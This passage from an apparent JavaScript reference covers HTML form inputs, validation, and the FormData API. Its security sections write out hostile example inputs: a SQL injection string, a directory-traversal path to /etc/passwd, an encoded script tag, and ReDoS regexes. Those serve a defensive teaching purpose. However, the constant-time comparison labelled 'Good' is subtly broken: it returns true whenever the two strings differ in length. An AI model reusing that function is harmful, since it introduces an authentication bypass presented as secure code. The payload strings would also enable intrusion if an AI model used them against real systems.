<input type="tel"> // Phone numbers (automatically suggests numeric keyboard)
<input type="number" inputmode="decimal"> // Decimals with number validation
```

### Autofill Tokens

The `autocomplete` attribute uses standardized tokens:

```javascript
input.autocomplete = 'email';
input.autocomplete = 'current-password';
input.autocomplete = 'new-password';
input.autocomplete = 'cc-number';
input.autocomplete = 'cc-exp';
input.autocomplete = 'shipping street-address';
input.autocomplete = 'section-blue shipping name';

// Common tokens:
// Personal: name, given-name, family-name, email, username, tel, bday
// Address: street-address, address-line1, address-line2, city, postal-code, country
// Payment: cc-name, cc-number, cc-exp, cc-csc
// Authentication: current-password, new-password, one-time-code
// Modifiers: shipping, billing, section-*
```

### Form Validation Events

```javascript
// invalid - Fired on individual controls during validation
input.addEventListener('invalid', (event) => {
  event.preventDefault(); // Prevent default validation UI
  // Custom validation display
});

// submit - Fired on form before submission
form.addEventListener('submit', (event) => {
  if (!form.checkValidity()) {
    event.preventDefault();
    // Handle validation errors
  }
});

// reset - Fired on form when reset
form.addEventListener('reset', (event) => {
  // Can prevent reset
  if (unsavedChanges) {
    event.preventDefault();
  }
});

// change - Fired on select, checkbox, radio when value commits
input.addEventListener('change', (event) => {
  console.log('Value changed to:', event.target.value);
});

// input - Fired during text input
input.addEventListener('input', (event) => {
  console.log('Current value:', event.target.value);
});
```

### Input Event Properties

```javascript
input.addEventListener('input', (event) => {
  event.inputType;       // String: type of input action
  event.data;            // String: inserted data or null
  event.dataTransfer;    // DataTransfer: for paste/drop or null
  event.isComposing;     // Boolean: during IME composition
  
  // inputType values include:
  // "insertText", "deleteContentBackward", "insertFromPaste",
  // "insertFromDrop", "deleteByCut", etc.
});
```

### Custom Validation Patterns

```javascript
// Custom validation message
input.setCustomValidity('Username already taken');
input.reportValidity(); // Show error

// Clear custom error
input.setCustomValidity('');

// Async validation pattern
async function validateAsync(input) {
  const value = input.value;
  
  try {
    const available = await checkAvailability(value);
    if (!available) {
      input.setCustomValidity('This username is taken');
    } else {
      input.setCustomValidity('');
    }
  } catch (error) {
    input.setCustomValidity('Unable to verify availability');
  }
  
  input.reportValidity();
}

input.addEventListener('blur', () => validateAsync(input));
```

### Form Submission via JavaScript

```javascript
// Method 1: Traditional form submission (full page load)
form.submit(); // Does NOT fire submit event or validate

// Method 2: Request submission (with validation)
form.requestSubmit(); // Fires submit event, validates

// Method 3: Fetch API
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  
  const formData = new FormData(form);
  
  try {
    const response = await fetch(form.action, {
      method: form.method,
      body: formData
    });
    
    if (response.ok) {
      // Handle success
    }
  } catch (error) {
    // Handle error
  }
});

// Method 4: URLSearchParams (for URL-encoded data)
const params = new URLSearchParams(new FormData(form));
fetch(form.action, {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: params
});
```

### Constraint Validation API Summary

```javascript
// Check validity
element.checkValidity();    // Boolean, fires invalid event
element.reportValidity();   // Boolean, shows UI

// Validation state
element.validity;           // ValidityState object
element.validationMessage;  // String (readonly)
element.willValidate;       // Boolean (readonly)

// Custom validation
element.setCustomValidity('Error message');
element.setCustomValidity(''); // Clear

// Form-level validation
form.checkValidity();       // Checks all controls
form.reportValidity();      // Checks and shows UI for all controls
```

### Disabled vs Readonly Comparison

```javascript
// disabled
input.disabled = true;
// - Not submitted in form data
// - Cannot receive focus
// - Not validated
// - Typically styled differently (grayed out)
// - Applies to all form controls

// readonly
input.readOnly = true;
// - IS submitted in form data
// - CAN receive focus
// - IS validated
// - Can be styled normally
// - Only applies to input and textarea
// - User cannot modify but scripts can
```

### Browser Inconsistencies

**[Inference]** Common cross-browser issues:

**File Input**

- Clearing files: only `input.value = ''` is reliable
- Setting files programmatically: DataTransfer support varies
- File paths: never exposed for security reasons

**Date Inputs**

- Safari has limited date input support (older versions)
- Different default formats displayed to users
- `valueAsDate` time zone handling differs

**Number Inputs**

- Spinner button styling varies significantly
- Scientific notation handling differs
- Locale-specific decimal separators may cause issues

**Validation UI**

- Browser-native validation bubbles styled differently
- Positioning and timing varies
- Some mobile browsers show different validation approaches

**Form Submission**

- Implicit submission (pressing Enter) behavior varies slightly
- Multiple submit buttons with same name handled differently in edge cases

---

## Input Validation

### Client-Side vs Server-Side Validation

Client-side validation provides immediate feedback and reduces server load, but is **never sufficient alone** because:

- JavaScript can be disabled
- HTTP requests can be crafted directly, bypassing the browser
- Browser developer tools allow DOM manipulation
- Automated tools can submit data without executing client-side code

Server-side validation is **mandatory** for security. Client-side validation is a user experience enhancement.

```javascript
// Client-side: UX enhancement
function validateEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Server-side: Security requirement
// Must validate again, regardless of client-side checks
```

### Input Sanitization vs Validation

**Validation**: Checking if input meets criteria (reject or accept) **Sanitization**: Transforming input to make it safe (modify)

```javascript
// Validation - reject invalid input
if (age < 0 || age > 150) {
  throw new Error('Invalid age');
}

// Sanitization - transform input
const sanitized = userInput.trim().toLowerCase();
const escaped = userInput.replace(/[<>]/g, '');
```

Different contexts require different approaches:

- User registration: Validate strictly
- Search queries: Sanitize for display, validate for SQL injection prevention
- HTML content: Sanitize using appropriate escaping/parsing libraries

### Common Validation Types

**String Length:**

```javascript
function validateLength(str, min, max) {
  const length = str.length; // Character count, not byte count
  return length >= min && length <= max;
}

// For Unicode-aware length (considering grapheme clusters)
function validateGraphemeLength(str, min, max) {
  const segmenter = new Intl.Segmenter('en', { granularity: 'grapheme' });
  const graphemes = [...segmenter.segment(str)];
  return graphemes.length >= min && graphemes.length <= max;
}
```

Note: `"👨‍👩‍👧‍👦".length` returns 11 (multiple code points), but represents one grapheme cluster.

**Numeric Ranges:**

```javascript
function validateRange(value, min, max, allowFloat = false) {
  const num = allowFloat ? parseFloat(value) : parseInt(value, 10);
  
  if (isNaN(num)) return false;
  if (!allowFloat && num !== parseFloat(value)) return false; // Rejects floats when integer required
  if (num < min || num > max) return false;
  
  return true;
}
```

**Pattern Matching:**

```javascript
// Email (basic pattern, not RFC 5322 compliant)
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// Phone (US format example)
const phoneRegex = /^\+?1?\s*\(?(\d{3})\)?[-.\s]?(\d{3})[-.\s]?(\d{4})$/;

// URL
const urlRegex = /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)$/;

// Credit card (basic Luhn check required separately)
const creditCardRegex = /^(\d{4}[-\s]?){3}\d{4}$/;
```

[Unverified] Regex patterns for email validation cannot perfectly match the RFC 5322 specification due to its complexity. Production systems typically use simplified patterns combined with verification emails.

### Type Coercion Pitfalls

JavaScript's type coercion can cause validation bypasses:

```javascript
// Dangerous comparisons
'5' == 5        // true
'' == 0         // true
null == undefined // true
[5] == 5        // true
' \t\n' == 0    // true

// Safe validation
function validatePositiveInteger(value) {
  // Strict equality prevents type coercion
  return typeof value === 'number' && 
         Number.isInteger(value) && 
         value > 0;
}

// String to number conversion
const num = Number(input); // Preferred over parseInt/parseFloat for validation
if (Number.isNaN(num)) {
  // Invalid number
}
```

**ParseInt gotchas:**

```javascript
parseInt('08')      // 8
parseInt('08', 10)  // 8 (always specify radix)
parseInt('5.99')    // 5 (truncates)
parseInt('5 items') // 5 (ignores trailing characters)
parseInt('items 5') // NaN
```

### Whitelist vs Blacklist Approaches

**Whitelist (allow known good):**

```javascript
// Preferred: Only allow specific characters
function validateUsername(username) {
  return /^[a-zA-Z0-9_-]{3,20}$/.test(username);
}

// Only allow specific file extensions
const allowedExtensions = ['.jpg', '.png', '.gif', '.pdf'];
const isValid = allowedExtensions.some(ext => filename.toLowerCase().endsWith(ext));
```

**Blacklist (block known bad):**

```javascript
// Less secure: Try to block dangerous patterns
function containsDangerousChars(input) {
  return /[<>\"'%;()&\+]/.test(input);
}
```

Whitelist is **strongly preferred** because:

- New attack vectors don't require updates
- Impossible to anticipate all dangerous inputs
- Encoding variations can bypass blacklists (`<script>` vs `%3Cscript%3E`)

### Cross-Site Scripting (XSS) Prevention

**Context-aware escaping:**

```javascript
// HTML context
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

// JavaScript context (in <script> tags or event handlers)
function escapeJs(str) {
  return str.replace(/[\\'"]/g, '\\$&')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r');
}

// URL context
function escapeUrl(str) {
  return encodeURIComponent(str);
}

// CSS context
function escapeCss(str) {
  return str.replace(/[^a-zA-Z0-9]/g, char => {
    return '\\' + char.charCodeAt(0).toString(16) + ' ';
  });
}
```

**Modern approaches:**

```javascript
// Use DOM APIs instead of innerHTML
const textNode = document.createTextNode(userInput); // Cannot execute scripts
element.appendChild(textNode);

// Or textContent
element.textContent = userInput; // Treats as text, not HTML

// For HTML, use sanitization libraries
// DOMPurify, js-xss, sanitize-html
```

### SQL Injection Prevention

**Parameterized queries (required):**

```javascript
// Bad: String concatenation
const query = `SELECT * FROM users WHERE email = '${userEmail}'`;
// Vulnerable to: ' OR '1'='1

// Good: Parameterized
const query = 'SELECT * FROM users WHERE email = ?';
db.execute(query, [userEmail]);

// Or named parameters
const query = 'SELECT * FROM users WHERE email = :email';
db.execute(query, { email: userEmail });
```

**Input validation layers:**

```javascript
// Even with parameterized queries, validate input format
function validateEmailForDb(email) {
  // Length check
  if (email.length > 254) return false; // RFC 5321 max length
  
  // Format check
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return false;
  
  // Character whitelist
  if (!/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(email)) {
    return false;
  }
  
  return true;
}
```

### File Upload Validation

**Multiple validation layers required:**

```javascript
// Client-side validation
function validateFile(file) {
  // Size check
  const maxSize = 5 * 1024 * 1024; // 5MB
  if (file.size > maxSize) {
    return { valid: false, error: 'File too large' };
  }
  
  // MIME type check (easily spoofed, not security layer)
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  if (!allowedTypes.includes(file.type)) {
    return { valid: false, error: 'Invalid file type' };
  }
  
  // Extension check
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
  const ext = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));
  if (!allowedExtensions.includes(ext)) {
    return { valid: false, error: 'Invalid file extension' };
  }
  
  return { valid: true };
}
```

**Server-side requirements:**

- Verify file signature (magic bytes) - first bytes of file content
- Re-encode images to strip metadata and potential exploits
- Store outside web root or with non-executable permissions
- Rename files to prevent directory traversal (`../../etc/passwd`)
- Scan with antivirus/malware detection

```javascript
// Check magic bytes (example for common image formats)
function verifyImageSignature(buffer) {
  const signatures = {
    jpeg: [0xFF, 0xD8, 0xFF],
    png: [0x89, 0x50, 0x4E, 0x47],
    gif: [0x47, 0x49, 0x46, 0x38]
  };
  
  for (const [type, sig] of Object.entries(signatures)) {
    if (sig.every((byte, i) => buffer[i] === byte)) {
      return type;
    }
  }
  
  return null;
}
```

### Date and Time Validation

```javascript
// ISO 8601 format validation
function validateISODate(dateStr) {
  const isoRegex = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{3})?Z?$/;
  if (!isoRegex.test(dateStr)) return false;
  
  const date = new Date(dateStr);
  return !isNaN(date.getTime());
}

// Date range validation
function validateDateRange(dateStr, minDate, maxDate) {
  const date = new Date(dateStr);
  if (isNaN(date.getTime())) return false;
  
  const min = new Date(minDate);
  const max = new Date(maxDate);
  
  return date >= min && date <= max;
}

// Business date validation (no weekends)
function isBusinessDay(dateStr) {
  const date = new Date(dateStr);
  const day = date.getUTCDay();
  return day !== 0 && day !== 6; // 0 = Sunday, 6 = Saturday
}
```

### Regular Expression Security

**ReDoS (Regular Expression Denial of Service):**

```javascript
// Dangerous: Catastrophic backtracking
const bad = /^(a+)+$/;
const bad2 = /^(a|a)*$/;
const bad3 = /^(.*)*$/;

// Testing 'aaaaaaaaaaaaaaaaaaaaX' causes exponential time complexity
// Can freeze application

// Safe alternatives
const safe = /^a+$/;
const safe2 = /^a*$/;
```

Vulnerable patterns typically involve:

- Nested quantifiers: `(a+)+`, `(a*)*`
- Alternation with overlap: `(a|a)*`, `(a|ab)*`
- Overlapping character classes with quantifiers

**Mitigation strategies:**

```javascript
// Timeout for regex execution
function safeRegexTest(regex, input, timeoutMs = 100) {
  const worker = new Worker('regex-worker.js');
  
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      worker.terminate();
      reject(new Error('Regex timeout'));
    }, timeoutMs);
    
    worker.postMessage({ regex: regex.source, input });
    worker.onmessage = (e) => {
      clearTimeout(timeout);
      resolve(e.data.result);
    };
  });
}

// Or use fixed-time algorithms
// Library: safe-regex, rxxr2
```

### Unicode and Encoding Issues

**Normalization:**

```javascript
// Visual spoofing: café (different Unicode representations)
const str1 = 'café';     // NFC: é as single character (U+00E9)
const str2 = 'café';     // NFD: e + combining accent (U+0065 U+0301)

str1 === str2           // false
str1.length !== str2.length // true

// Normalize before comparison
function normalizeString(str) {
  return str.normalize('NFC'); // or 'NFD', 'NFKC', 'NFKD'
}

normalizeString(str1) === normalizeString(str2) // true
```

**Homograph attacks:**

```javascript
// Cyrillic 'а' (U+0430) looks identical to Latin 'a' (U+0061)
const latinA = 'a';
const cyrillicA = 'а';

latinA === cyrillicA // false

// Domain spoofing: раypal.com (Cyrillic 'а') vs paypal.com
function containsSuspiciousChars(str) {
  // Check for mixed scripts
  const scripts = new Set();
  for (const char of str) {
    const code = char.codePointAt(0);
    if (code >= 0x0400 && code <= 0x04FF) scripts.add('Cyrillic');
    else if (code >= 0x0020 && code <= 0x007F) scripts.add('Latin');
    // Add more script ranges as needed
  }
  return scripts.size > 1; // Mixed scripts
}
```

**Zero-width characters:**

```javascript
// Invisible characters for obfuscation
const text = 'admin\u200B'; // Contains zero-width space
text === 'admin' // false
text.trim() === 'admin' // false (trim doesn't remove zero-width)

// Remove zero-width characters
function removeZeroWidth(str) {
  return str.replace(/[\u200B-\u200D\uFEFF]/g, '');
}
```

### Length Limits and DoS Prevention

**Memory exhaustion:**

```javascript
// Validate input size before processing
function validateInputSize(input, maxBytes = 1024 * 1024) {
  // String length is character count, not byte count
  const encoder = new TextEncoder();
  const bytes = encoder.encode(input).length;
  
  return bytes <= maxBytes;
}

// Streaming validation for large inputs
async function validateLargeInput(stream, maxSize) {
  let totalSize = 0;
  const reader = stream.getReader();
  
  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      
      totalSize += value.length;
      if (totalSize > maxSize) {
        throw new Error('Input exceeds maximum size');
      }
    }
  } finally {
    reader.releaseLock();
  }
}
```

**Computational limits:**

```javascript
// Limit complexity of operations
function validatePassword(password, maxComputationTime = 100) {
  const start = Date.now();
  
  // Expensive validation logic here
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumbers = /\d/.test(password);
  const hasSpecial = /[!@#$%^&*]/.test(password);
  
  if (Date.now() - start > maxComputationTime) {
    throw new Error('Validation timeout');
  }
  
  return hasUpperCase && hasLowerCase && hasNumbers && hasSpecial;
}
```

### Validation Feedback Security

**Information disclosure:**

```javascript
// Bad: Reveals which field failed
if (!validateEmail(email)) {
  return { error: 'Invalid email address' };
}
if (!validatePassword(password)) {
  return { error: 'Invalid password' };
}

// For login: Don't reveal if user exists
// Bad
if (!userExists(email)) {
  return { error: 'User not found' };
}

// Good: Generic message
if (!userExists(email) || !passwordMatches(password)) {
  return { error: 'Invalid credentials' };
}
```

**Timing attacks:**

```javascript
// Bad: Early return reveals information through timing
function comparePasswords(input, stored) {
  if (input.length !== stored.length) return false;
  for (let i = 0; i < input.length; i++) {
    if (input[i] !== stored[i]) return false; // Early exit
  }
  return true;
}

// Good: Constant-time comparison
function constantTimeCompare(a, b) {
  if (a.length !== b.length) {
    b = a; // Make lengths match to keep timing constant
  }
  
  let mismatch = a.length !== b.length ? 1 : 0;
  for (let i = 0; i < a.length; i++) {
    mismatch |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return mismatch === 0;
}

// Or use built-in crypto.timingSafeEqual for buffers
```

### Cascading Validation

**Fail fast vs complete validation:**

```javascript
// Fail fast: Stop at first error (better UX for simple forms)
function validateUserFast(data) {
  if (!data.email) return { valid: false, error: 'Email required' };
  if (!validateEmail(data.email)) return { valid: false, error: 'Invalid email' };
  if (!data.password) return { valid: false, error: 'Password required' };
  if (data.password.length < 8) return { valid: false, error: 'Password too short' };
  
  return { valid: true };
}

// Complete validation: Collect all errors (better UX for complex forms)
function validateUserComplete(data) {
  const errors = {};
  
  if (!data.email) errors.email = 'Email required';
  else if (!validateEmail(data.email)) errors.email = 'Invalid email';
  
  if (!data.password) errors.password = 'Password required';
  else if (data.password.length < 8) errors.password = 'Password too short';
  
  if (!data.age) errors.age = 'Age required';
  else if (data.age < 18) errors.age = 'Must be 18 or older';
  
  return {
    valid: Object.keys(errors).length === 0,
    errors
  };
}
```

### Schema Validation Libraries

**Validation approaches:**

```javascript
// Joi
const Joi = require('joi');

const schema = Joi.object({
  email: Joi.string().email().required(),
  age: Joi.number().integer().min(0).max(150),
  password: Joi.string().min(8).pattern(/[A-Z]/).pattern(/[0-9]/)
});

const { error, value } = schema.validate(data);

// Yup
const yup = require('yup');

const schema = yup.object({
  email: yup.string().email().required(),
  age: yup.number().positive().integer().max(150),
  password: yup.string().min(8).matches(/[A-Z]/).matches(/[0-9]/)
});

await schema.validate(data);

// Zod (TypeScript-first)
const z = require('zod');

const schema = z.object({
  email: z.string().email(),
  age: z.number().int().positive().max(150),
  password: z.string().min(8).regex(/[A-Z]/).regex(/[0-9]/)
});

const result = schema.safeParse(data);
```

### Contextual Validation

**Business logic validation:**

```javascript
// Field-level validation alone is insufficient
function validateOrder(order) {
  // Field validation
  if (!order.quantity || order.quantity <= 0) {
    return { valid: false, error: 'Invalid quantity' };
  }
  
  // Business rule validation
  if (order.quantity > order.stockAvailable) {
    return { valid: false, error: 'Insufficient stock' };
  }
  
  // Cross-field validation
  if (order.discount > order.subtotal) {
    return { valid: false, error: 'Discount exceeds subtotal' };
  }
  
  // Temporal validation
  if (order.deliveryDate < new Date()) {
    return { valid: false, error: 'Delivery date must be in future' };
  }
  
  return { valid: true };
}
```

**State-dependent validation:**

```javascript
// Validation rules change based on state
function validateUserUpdate(user, updates, currentState) {
  // Email can only change if verified
  if (updates.email && updates.email !== user.email) {
    if (!currentState.isEmailVerified) {
      return { valid: false, error: 'Verify current email first' };
    }
  }
  
  // Role changes require admin privileges
  if (updates.role && updates.role !== user.role) {
    if (!currentState.isAdmin) {
      return { valid: false, error: 'Insufficient permissions' };
    }
  }
  
  return { valid: true };
}
```

---

## FormData API

### Core Concepts and Construction

The FormData interface provides a programmatic way to construct key-value pairs representing form fields and their values, which can be transmitted using `XMLHttpRequest`, `fetch()`, or other HTTP APIs. FormData objects are particularly designed for encoding data in `multipart/form-data` format.

#### Constructor Patterns

```javascript
// Empty FormData object
const formData = new FormData();

// Populate from existing form element
const form = document.querySelector('form');
const formData = new FormData(form);

// With optional submitter parameter (button that triggered submission)
const submitButton = document.querySelector('button[type="submit"]');
const formData = new FormData(form, submitButton);
```

The submitter parameter captures which submit button was clicked, including its name/value if present. This matters when forms have multiple submit buttons with different values.

### Methods and Operations

#### Appending Data

```javascript
const fd = new FormData();

// Append string value
fd.append('username', 'john_doe');

// Append number (converted to string)
fd.append('age', 25);

// Append File object
const fileInput = document.querySelector('input[type="file"]');
fd.append('avatar', fileInput.files[0]);

// Append Blob with filename
const blob = new Blob(['content'], { type: 'text/plain' });
fd.append('document', blob, 'readme.txt');

// Multiple values for same key
fd.append('tags', 'javascript');
fd.append('tags', 'web');
fd.append('tags', 'api');
```

The `append()` method always adds a new value, even if the key already exists. This enables multiple values per key, which is standard behavior for form controls like checkboxes or multi-select inputs.

#### Setting and Replacing Values

```javascript
// Set replaces all existing values for the key
fd.set('username', 'jane_doe');

// If key doesn't exist, set() and append() behave identically
fd.set('email', 'jane@example.com');

// Setting a file
fd.set('profile_pic', file, 'profile.jpg');
```

The distinction between `append()` and `set()` becomes critical when handling form data that might already contain the key. `set()` ensures exactly one value exists for the key.

#### Retrieving Values

```javascript
// Get first value for key
const username = fd.get('username');

// Get all values for key (returns array)
const tags = fd.getAll('tags'); // ['javascript', 'web', 'api']

// Check if key exists
const hasEmail = fd.has('email'); // true/false

// Delete key and all its values
fd.delete('username');
```

`get()` returns only the first value when multiple values exist for a key. `getAll()` is necessary to retrieve multiple checkbox selections or multi-select options.

#### Iteration Methods

```javascript
// Iterate over keys
for (const key of fd.keys()) {
  console.log(key);
}

// Iterate over values
for (const value of fd.values()) {
  console.log(value);
}

// Iterate over [key, value] pairs
for (const [key, value] of fd.entries()) {
  console.log(`${key}: ${value}`);
}

// Direct iteration (equivalent to entries())
for (const [key, value] of fd) {
  console.log(`${key}: ${value}`);
}

// forEach method
fd.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});
```

When iterating over FormData with multiple values for a single key, each key-value pair appears as a separate entry in the iteration.

### File Handling

#### File Objects

```javascript
// Single file upload
const fileInput = document.querySelector('input[type="file"]');
const file = fileInput.files[0];

fd.append('upload', file);
// Transmitted with original filename and MIME type

// Override filename
fd.append('upload', file, 'custom-name.pdf');
```

File objects contain metadata: `name`, `size` (bytes), `type` (MIME), and `lastModified` (timestamp). The FormData serialization includes this metadata in the multipart encoding.

#### Multiple File Upload

```javascript
// HTML: <input type="file" multiple>
const fileInput = document.querySelector('input[type="file"][multiple]');

// Append each file individually
Array.from(fileInput.files).forEach((file, index) => {
  fd.append('files[]', file);
  // Or use distinct keys: fd.append(`file_${index}`, file);
});

// Server receives multiple values for 'files[]' key
```

Array notation (`files[]`) is a common convention signaling to server-side frameworks that multiple values should be collected into an array, but this is framework-specific, not part of the FormData spec.

#### Blob Construction

```javascript
// Create blob from string content
const jsonBlob = new Blob(
  [JSON.stringify({ data: 'value' })],
  { type: 'application/json' }
);
fd.append('metadata', jsonBlob, 'metadata.json');

// Canvas to blob
canvas.toBlob((blob) => {
  fd.append('image', blob, 'canvas-export.png');
}, 'image/png');

// ArrayBuffer to blob
const buffer = new ArrayBuffer(8);
const blob = new Blob([buffer], { type: 'application/octet-stream' });
fd.append('binary', blob, 'data.bin');
```

Blobs require explicit filename parameter in `append()` or `set()`, unlike File objects which have inherent filenames.

### Network Transmission

#### Fetch API Integration

```javascript
const fd = new FormData();
fd.append('username', 'john');
fd.append('avatar', fileInput.files[0]);

fetch('/api/upload', {
  method: 'POST',
  body: fd
  // DO NOT set Content-Type header manually
})
.then(response => response.json())
.then(data => console.log(data));
```

**Critical**: When using FormData with fetch, do not set the `Content-Type` header. The browser automatically sets `Content-Type: multipart/form-data` with the appropriate boundary parameter. Manual header setting will break multipart encoding.

#### XMLHttpRequest Integration

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', '/api/upload');

// Optional progress tracking
xhr.upload.addEventListener('progress', (e) => {
  if (e.lengthComputable) {
    const percentComplete = (e.loaded / e.total) * 100;
    console.log(`Upload progress: ${percentComplete}%`);
  }
});

xhr.addEventListener('load', () => {
  console.log('Upload complete:', xhr.responseText);
});

xhr.send(fd);
```

XMLHttpRequest provides upload progress events, which fetch API historically lacked (though `ReadableStream` progressively addresses this).

#### Request Object Construction

```javascript
// Create Request with FormData body
const request = new Request('/api/endpoint', {
  method: 'POST',
  body: fd
});

fetch(request).then(/* ... */);

// Clone FormData through request cloning
const clonedRequest = request.clone();
```

### Encoding and Serialization

#### Multipart/Form-Data Structure

FormData serializes to `multipart/form-data` format with structure:

```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

john_doe
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

[binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

The boundary string is automatically generated and must not appear in the encoded data. Each part contains headers followed by the value.

#### Boundary Generation

The browser generates a unique boundary string (typically prefixed with `----WebKitFormBoundary` or similar vendor-specific prefix) and includes it in the Content-Type header:

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

**[Inference]** Manual boundary generation and multipart encoding is possible but error-prone, making FormData the preferred approach for this format.

### Form Element Integration

#### Automatic Population from Form

```javascript
const form = document.querySelector('#myForm');
const fd = new FormData(form);

// Includes all named form controls:
// - input (text, email, number, hidden, etc.)
// - textarea
// - select
// - input[type="file"]
// - input[type="checkbox"] (if checked)
// - input[type="radio"] (if selected)
```

Only **successful** form controls (enabled, named, and with valid state) are included. Disabled inputs, unnamed inputs, and unchecked checkboxes without special handling are excluded.

#### Checkbox and Radio Handling

```html
<!-- Multiple checkboxes with same name -->
<input type="checkbox" name="interests" value="coding" checked>
<input type="checkbox" name="interests" value="music" checked>
<input type="checkbox" name="interests" value="sports">
```

```javascript
const fd = new FormData(form);
fd.getAll('interests'); // ['coding', 'music']
```

Unchecked checkboxes don't appear in FormData. To include unchecked state, use hidden input with same name or handle programmatically:

```javascript
// Include unchecked state explicitly
const checkbox = document.querySelector('#agree');
fd.append('agree', checkbox.checked ? 'true' : 'false');
```

#### Submit Button Values

```html
<button type="submit" name="action" value="save">Save</button>
<button type="submit" name="action" value="delete">Delete</button>
```

```javascript
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const submitter = e.submitter; // Button that was clicked
  const fd = new FormData(form, submitter);
  
  // fd.get('action') === 'save' or 'delete' depending on click
});
```

Without the submitter parameter, submit button values are excluded from FormData.

### Data Transformation and Validation

#### Converting FormData to JSON

```javascript
// Object with single values
const obj = Object.fromEntries(fd);

// Preserve multiple values
const obj = {};
for (const [key, value] of fd.entries()) {
  if (obj[key]) {
    if (Array.isArray(obj[key])) {
      obj[key].push(value);
    } else {
      obj[key] = [obj[key], value];
    }
  } else {
    obj[key] = value;
  }
}

const json = JSON.stringify(obj);
```

**[Inference]** File objects don't serialize to JSON meaningfully. Conversion to JSON typically requires extracting text content, base64 encoding, or uploading files separately.

#### Converting JSON to FormData

```javascript
const data = {
  username: 'john',
  email: 'john@example.com',
  tags: ['js', 'web']
};

const fd = new FormData();

Object.entries(data).forEach(([key, value]) => {
  if (Array.isArray(value)) {
    value.forEach(item => fd.append(key, item));
  } else {
    fd.append(key, value);
  }
});
```

#### URL-Encoded Format Conversion

```javascript
// FormData to URLSearchParams
const params = new URLSearchParams(fd);

// Results in application/x-www-form-urlencoded format
fetch('/api/endpoint', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: params
});
```

**[Inference]** URLSearchParams cannot handle File/Blob objects, making this conversion suitable only for text data.

### Advanced Patterns

#### Nested Object Structures

```javascript
// Flat structure with naming convention
fd.append('user[name]', 'John');
fd.append('user[email]', 'john@example.com');
fd.append('user[address][city]', 'New York');
fd.append('user[address][zip]', '10001');

// Server frameworks (Rails, Laravel) parse this into nested objects
// { user: { name: 'John', email: '...', address: { city: '...', zip: '...' }}}
```

**[Unverified]** Bracket notation parsing is framework-dependent and not standardized in the FormData specification.

#### Dynamic Form Building

```javascript
function buildFormData(formData, data, parentKey) {
  if (data && typeof data === 'object' && !(data instanceof Date) && !(data instanceof File)) {
    Object.keys(data).forEach(key => {
      buildFormData(formData, data[key], parentKey ? `${parentKey}[${key}]` : key);
    });
  } else {
    const value = data == null ? '' : data;
    formData.append(parentKey, value);
  }
}

const fd = new FormData();
buildFormData(fd, {
  user: {
    name: 'John',
    profile: {
      age: 30,
      avatar: fileObject
    }
  }
});
```

#### Cloning FormData

FormData objects cannot be directly cloned with spread or `Object.assign()`:

```javascript
// Create new FormData with same entries
function cloneFormData(original) {
  const clone = new FormData();
  for (const [key, value] of original.entries()) {
    clone.append(key, value);
  }
  return clone;
}

const fd2 = cloneFormData(fd);
```

**[Inference]** File objects in FormData reference the same underlying file data when cloned this way, rather than creating independent copies.

#### Modifying Existing Form Submissions

```javascript
form.addEventListener('submit', (e) => {
  e.preventDefault();
  
  const fd = new FormData(form);
  
  // Add authentication token
  fd.append('csrf_token', getCSRFToken());
  
  // Remove sensitive field
  fd.delete('password_confirm');
  
  // Modify existing value
  const email = fd.get('email');
  fd.set('email', email.toLowerCase());
  
  // Add computed field
  fd.append('timestamp', Date.now());
  
  fetch(form.action, {
    method: form.method,
    body: fd
  });
});
```

### Browser Compatibility and Polyfills

FormData is supported in all modern browsers (Chrome 7+, Firefox 4+, Safari 5+, Edge 12+, IE 10+). Key feature support variations:

- **FormData constructor with form element**: IE 10+, Chrome 7+, Firefox 39+, Safari 5.1+
- **FormData.entries/keys/values/forEach**: Chrome 50+, Firefox 44+, Safari 11.1+, Edge 18+
- **FormData with submitter parameter**: Chrome 74+, Firefox 76+, Safari 15+

```javascript
// Feature detection
if (typeof FormData !== 'undefined') {
  // FormData available
  const fd = new FormData();
}

// Check iteration support
const supportsIteration = 'entries' in FormData.prototype;
```

### Security Considerations

#### File Upload Validation

```javascript
const fileInput = document.querySelector('input[type="file"]');
const file = fileInput.files[0];

// Client-side validation (NOT security, only UX)
const MAX_SIZE = 5 * 1024 * 1024; // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];

if (file.size > MAX_SIZE) {
  alert('File too large');
  return;
}

